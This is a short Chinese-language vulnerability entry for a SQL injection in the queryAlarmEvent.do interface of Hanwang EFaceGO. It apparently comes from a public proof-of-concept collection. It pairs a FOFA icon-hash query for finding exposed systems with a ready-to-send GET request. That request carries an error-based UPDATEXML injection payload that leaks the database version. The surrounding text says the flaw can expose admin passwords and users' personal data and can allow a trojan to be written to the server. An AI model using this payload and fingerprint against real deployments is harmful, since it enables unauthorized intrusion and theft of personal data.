## 汉王EFaceGO-queryAlarmEvent.do-sql注入漏洞

## 一、漏洞简介
汉王EFaceGO queryAlarmEvent.do 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。02搜索引擎

## fofa
```
icon_hash="1380907357"
```

## poc
```
GET /manage/alarm/queryAlarmEvent.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: 1
```
